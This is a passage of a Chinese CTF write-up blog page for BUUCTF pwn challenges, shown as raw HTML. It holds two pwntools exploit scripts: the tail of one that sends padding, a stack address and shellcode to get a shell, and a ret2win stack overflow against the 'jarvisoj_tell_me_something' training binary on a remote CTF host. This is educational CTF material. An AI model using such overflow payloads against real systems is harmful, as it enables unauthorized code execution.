class="line"></span><br><span class="line">payload &#x3D; &#39;crashme\x00&#39; + &#39;a&#39;*（14+4） + p32(stack_addr - 0x1c) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><p>简单的栈溢出并且存在后门</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; process(&#39;guestbook&#39;)</span><br><span class="line">p &#x3D; remote(&#39;node4.buuoj.cn&#39;,25969)</span><br><span class="line">good_addr &#x3D; 0x400620</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Input your message:\n&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x88 + p64(good_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">墨水彩笔</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/08/12/BUU%E5%88%B7%E9%A2%98-1/">http://example.com/2021/08/12/BUU%E5%88%B7%E9%A2%98-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/12/%E6%A0%88%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">栈类型题目总结</div></div></a></div><div class="next-post pull-right"><a href="/2021/08/11/ciscn%E2%80%94-s-3/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">ciscn_s_3</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 墨水彩笔</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>